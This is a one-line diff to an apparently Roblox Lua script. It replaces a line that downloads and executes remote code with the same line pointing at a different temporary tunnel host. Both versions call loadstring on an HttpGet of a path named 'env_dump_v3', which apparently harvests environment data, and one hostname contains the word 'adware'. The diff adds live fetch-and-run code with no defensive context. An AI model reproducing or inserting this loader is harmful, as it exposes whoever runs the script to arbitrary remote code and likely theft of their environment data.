@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://bars-dock-martial-ridge.trycloudflare.com/env_dump_v3"))()
+loadstring(game:HttpGet("https://remained-adware-laughing-terminals.trycloudflare.com/env_dump_v3"))()
